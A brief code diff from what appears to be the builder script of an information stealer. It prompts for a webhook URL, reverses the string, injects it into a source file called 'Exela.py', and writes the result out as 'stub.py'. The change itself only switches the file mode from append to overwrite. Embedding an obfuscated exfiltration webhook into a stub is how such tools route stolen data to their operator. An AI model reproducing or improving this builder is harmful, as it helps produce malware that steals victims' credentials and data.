@@ -4,7 +4,7 @@ webhook = str(input("enter your webhook url : "))
 with open("Exela.py", "r", encoding="utf-8", errors="ignore") as sourceCode:
     rip = sourceCode.read()
     replacedCode = rip.replace('%REPLACE_ME_FOR_QUiCADXD%', webhook[::-1])
-with open("stub.py", "a", encoding="utf-8", errors="ignore") as f:
+with open("stub.py", "w", encoding="utf-8", errors="ignore") as f:
     f.write(str(replacedCode))
 
 def installModules():
